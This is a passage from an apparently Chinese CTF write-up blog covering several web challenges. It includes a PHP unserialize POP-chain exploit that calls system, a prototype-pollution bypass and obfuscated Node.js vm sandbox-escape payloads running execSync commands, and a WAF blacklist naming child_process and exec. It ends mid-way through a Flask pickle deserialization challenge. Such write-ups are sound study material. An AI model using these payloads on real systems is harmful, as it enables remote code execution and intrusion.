class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="title function_">show_source</span><span class="params">(__FILE__)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cache</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> $key;</span><br><span class="line">    <span class="keyword">public</span> $value;</span><br><span class="line">    <span class="keyword">public</span> $expired;</span><br><span class="line">    <span class="keyword">public</span> $helper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">($key, $value, $helper)</span> &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;key = $key;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;value = $value;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;helper = $helper;</span><br><span class="line"></span><br><span class="line">        $<span class="built_in">this</span>-&gt;expired = False;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__wakeup</span><span class="params">()</span> &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;expired = False;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">expired</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($<span class="built_in">this</span>-&gt;expired) &#123;</span><br><span class="line">            $<span class="built_in">this</span>-&gt;helper-&gt;clean($<span class="built_in">this</span>-&gt;key);</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Storage</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">()</span> &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;store = array();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__set</span><span class="params">($name, $value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$<span class="built_in">this</span>-&gt;store) &#123;</span><br><span class="line">            $<span class="built_in">this</span>-&gt;store = array();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!$value-&gt;expired()) &#123;</span><br><span class="line">            $<span class="built_in">this</span>-&gt;store[$name] = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__get</span><span class="params">($name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="built_in">this</span>-&gt;data[$name];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Helper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">($funcs)</span> &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;funcs = $funcs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__call</span><span class="params">($name, $args)</span> &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;funcs[$name](...$args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> $storage;</span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__destruct</span><span class="params">()</span> &#123;</span><br><span class="line">        foreach ($<span class="built_in">this</span>-&gt;data <span class="type">as</span> <span class="variable">$key</span> <span class="operator">=</span>&gt; $value) &#123;</span><br><span class="line">            $<span class="built_in">this</span>-&gt;storage-&gt;$key = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset($_GET[<span class="string">&#x27;u&#x27;</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>一开始对这里有点陌生 自己举个例子理解一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696860418282-2b207032-929a-4a0c-b3e2-98bf59c8ba6b.png" alt="img"></p><p>如果这是<code>$this-&gt;data</code>是个数组 那么就很好理解了 记录一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696860466228-d3470799-1f0a-41bb-bf4b-516a1c4f8704.png" alt="img"></p><p>然后是pop链构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cache</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> $key;</span><br><span class="line">    <span class="keyword">public</span> $value;</span><br><span class="line">    <span class="keyword">public</span> $expired;</span><br><span class="line">    <span class="keyword">public</span> $helper;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Storage</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> $store;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Helper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> $funcs;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> $storage;</span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">DataObject</span>();</span><br><span class="line">$a-&gt;storage = <span class="keyword">new</span> <span class="title class_">Storage</span>();</span><br><span class="line">$b = <span class="keyword">new</span> <span class="title class_">Cache</span>();</span><br><span class="line">$a-&gt;data = [<span class="string">&quot;Z1d10t&quot;</span>=&gt;$b];</span><br><span class="line">$b-&gt;expired = <span class="number">1</span>;</span><br><span class="line">$b-&gt;helper = <span class="keyword">new</span> <span class="title class_">Helper</span>();</span><br><span class="line">$b-&gt;helper-&gt;funcs = [<span class="string">&quot;clean&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>];</span><br><span class="line">$b-&gt;key = <span class="string">&#x27;env&#x27;</span>;</span><br><span class="line">echo <span class="title function_">serialize</span><span class="params">($a)</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>这里赋值数组时候不能用<code>array(&quot;1&quot;=&gt;&quot;1&quot;);</code> 要用<code>[&quot;1&quot;=&gt;&quot;1&quot;] </code> 实测第一种会断开链子</li><li>expired函数调用在这里 很微妙 容易忽略<img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696862014638-0334abee-df42-4565-9ab4-ad31e89c3f51.png" alt="img"></li></ul><h2 id="WEEK2-ez-sandbox"><a href="#WEEK2-ez-sandbox" class="headerlink" title="[WEEK2]ez_sandbox"></a>[WEEK2]ez_sandbox</h2><p>一道原型链污染+vm沙盒逃逸的题目</p><p>源码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = require(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> vm = require(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = require(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = require(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = require(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    secret: crypto.randomBytes(<span class="number">64</span>).toString(<span class="string">&#x27;hex&#x27;</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">true</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> users = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> admins = &#123;&#125;</span><br><span class="line"></span><br><span class="line">function merge(target, source) &#123; <span class="comment">//污染函数</span></span><br><span class="line">    <span class="keyword">for</span> (let key in source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function clone(source) &#123; <span class="comment">//调用污染函数点</span></span><br><span class="line">    <span class="keyword">return</span> merge(&#123;&#125;, source)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function waf(code) &#123;</span><br><span class="line">    let blacklist = [<span class="string">&#x27;constructor&#x27;</span>, <span class="string">&#x27;mainModule&#x27;</span>, <span class="string">&#x27;require&#x27;</span>, <span class="string">&#x27;child_process&#x27;</span>, <span class="string">&#x27;process&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execSync&#x27;</span>, <span class="string">&#x27;execFile&#x27;</span>, <span class="string">&#x27;execFileSync&#x27;</span>, <span class="string">&#x27;spawn&#x27;</span>, <span class="string">&#x27;spawnSync&#x27;</span>, <span class="string">&#x27;fork&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> (let v of blacklist) &#123;</span><br><span class="line">        <span class="keyword">if</span> (code.includes(v)) &#123;</span><br><span class="line">            throw <span class="built_in">new</span> Error(v + <span class="string">&#x27; is banned&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function requireLogin(req, res, next) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.session.user) &#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        next()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(function(req, res, next) &#123;</span><br><span class="line">    <span class="keyword">for</span> (let key in Object.prototype) &#123;</span><br><span class="line">        <span class="built_in">delete</span> Object.prototype[key]</span><br><span class="line">    &#125;</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, requireLogin, function(req, res) &#123;</span><br><span class="line">    res.sendFile(__dirname + <span class="string">&#x27;/public/index.html&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/login&#x27;</span>, function(req, res) &#123;</span><br><span class="line">    res.sendFile(__dirname + <span class="string">&#x27;/public/login.html&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/register&#x27;</span>, function(req, res) &#123;</span><br><span class="line">    res.sendFile(__dirname + <span class="string">&#x27;/public/register.html&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/login&#x27;</span>, function(req, res) &#123;</span><br><span class="line">    let &#123; username, password &#125; = clone(req.body)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (username in users &amp;&amp; password === users[username]) &#123;</span><br><span class="line">        req.session.user = username</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (username in admins) &#123;</span><br><span class="line">            req.session.role = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            req.session.role = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.send(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login success&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login failed&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/register&#x27;</span>, function(req, res) &#123;</span><br><span class="line">    let &#123; username, password &#125; = clone(req.body)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (username in users) &#123;</span><br><span class="line">        res.send(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;register failed&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        users[username] = password</span><br><span class="line">        res.send(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;register success&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/profile&#x27;</span>, requireLogin, function(req, res) &#123;</span><br><span class="line">    res.send(&#123;</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: req.session.user,</span><br><span class="line">        <span class="string">&#x27;role&#x27;</span>: req.session.role</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/sandbox&#x27;</span>, requireLogin, function(req, res) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.session.role === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        let code = req.body.code</span><br><span class="line">        let sandbox = Object.create(null)</span><br><span class="line">        let context = vm.createContext(sandbox)</span><br><span class="line">        </span><br><span class="line">        try &#123;</span><br><span class="line">            waf(code)</span><br><span class="line">            let result = vm.runInContext(code, context)</span><br><span class="line">            res.send(&#123;</span><br><span class="line">                <span class="string">&#x27;result&#x27;</span>: result</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            res.send(&#123;</span><br><span class="line">                <span class="string">&#x27;result&#x27;</span>: e.message</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(&#123;</span><br><span class="line">            <span class="string">&#x27;result&#x27;</span>: <span class="string">&#x27;Your role is not admin, so you can not run any code&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/logout&#x27;</span>, requireLogin, function(req, res) &#123;</span><br><span class="line">    req.session.destroy()</span><br><span class="line">    res.redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, function() &#123;</span><br><span class="line">    console.log(<span class="string">&#x27;server start listening on :3000&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>首先需要原型链污染让我们以admin身份登录</p><p>这里禁用了__proto__</p><p>所以这里可以通过<code>constructor.prototype</code>来bypass</p><p>因为<code>__proto__=constructor.prototype</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697265247445-5346a095-844e-4832-8980-ad26201c773d.png" alt="img"></p><p>之后就是vm沙盒逃逸 参考<a href="https://xz.aliyun.com/t/11859#toc-4">NodeJS VM和VM2沙箱逃逸 - 先知社区</a></p><p>因为this为null</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697288378181-1f6cf69e-9bf6-4984-b92f-951579eee84d.png" alt="img"></p><p>所以我们要用到一个函数中的内置对象的属性<code>arguments.callee.caller</code>，它可以返回函数的调用者。</p><p>我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的<code>arguments.callee.caller</code>就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了</p><p>除此之外这道题沙箱没有返回值 我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出</p><p>在沙箱内可以通过 throw 来抛出一个对象 这个对象会被沙箱外的 catch 语句捕获 然后会访问它的 message 属性 (即 e.message)<br>通过 JavaScript 的 Proxy 类或对象的 <strong>defineGetter</strong> 方法来设置一个 getter 使得在沙箱外访问 e 的 message 属性 (即 e.message) 时能够调用某个函数</p><p>除此之外还要绕一下waf</p><p>这里提供两种paylaod </p><p>bypass姿势参考：<a href="https://www.anquanke.com/post/id/237032#h3-3">nodejs中代码执行绕过的一些技巧-安全客 - 安全资讯平台</a><a href="https://forum.butian.net/share/1631">奇安信攻防社区-NodeJS中的RCE的利用和绕过</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#第一种利用模板字符串</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">      <span class="keyword">const</span> p = (cc[<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>](<span class="string">`return <span class="subst">$&#123;<span class="string">`proces`</span>&#125;</span>s`</span>))();</span><br><span class="line">      <span class="keyword">return</span> p[<span class="string">`<span class="subst">$&#123;<span class="string">`mainModul`</span>&#125;</span>e`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>](<span class="string">&#x27;child_pr&#x27;</span>+<span class="string">&#x27;ocess&#x27;</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;<span class="string">`](&#x27;id&#x27;).toString();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">#第二种利用字符串拼接</span></span><br><span class="line"><span class="string">throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc[&#x27;const&#x27;+&#x27;ructor&#x27;][&#x27;cons&#x27;+&#x27;tructor&#x27;](&#x27;return pr&#x27;+&#x27;ocess&#x27;))();</span></span><br><span class="line"><span class="string">            return p[&#x27;mai&#x27;+&#x27;nModule&#x27;][&#x27;re&#x27;+&#x27;quire&#x27;](&#x27;child_p&#x27;+&#x27;rocess&#x27;)[&#x27;exe&#x27;+&#x27;cSync&#x27;](&#x27;cat /f*&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697288660433-2c0dc5cd-e4fe-41c6-abf5-097466e5fde7.png" alt="img"></p><h1 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h1><h2 id="Week-3-notebook"><a href="#Week-3-notebook" class="headerlink" title="[Week 3] notebook"></a>[Week 3] notebook</h2><p>考点：</p><ul><li>pickle反序列化</li></ul><p>源码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, request, render_template, session</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line">app.<span class="property">config</span>[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.<span class="title function_">urandom</span>(<span class="number">2</span>).<span class="title function_">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Note</span>(object):</span><br><span class="line">    def <span class="title function_">__init__</span>(self, name, content):</span><br><span class="line">        self.<span class="property">_name</span> = name</span><br><span class="line">        self.<span class="property">_content</span> = content</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def <span class="title function_">name</span>(self):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="property">_name</span></span><br><span class="line">    </span><br><span class="line">    @property</span><br><span class="line">    def <span class="title function_">content</span>(self):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="property">_content</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/&lt;path:note_id&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">def <span class="title function_">view_note</span>(note_id):</span><br><span class="line">    notes = session.<span class="title function_">get</span>(<span class="string">&#x27;notes&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> not <span class="attr">notes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;note.html&#x27;</span>, msg=<span class="string">&#x27;You have no notes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    note_raw = notes.<span class="title function_">get</span>(note_id)</span><br><span class="line">    <span class="keyword">if</span> not <span class="attr">note_raw</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;note.html&#x27;</span>, msg=<span class="string">&#x27;This note does not exist&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    note = pickle.<span class="title function_">loads</span>(note_raw)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;note.html&#x27;</span>, note_id=note_id, note_name=note.<span class="property">name</span>, note_content=note.<span class="property">content</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span 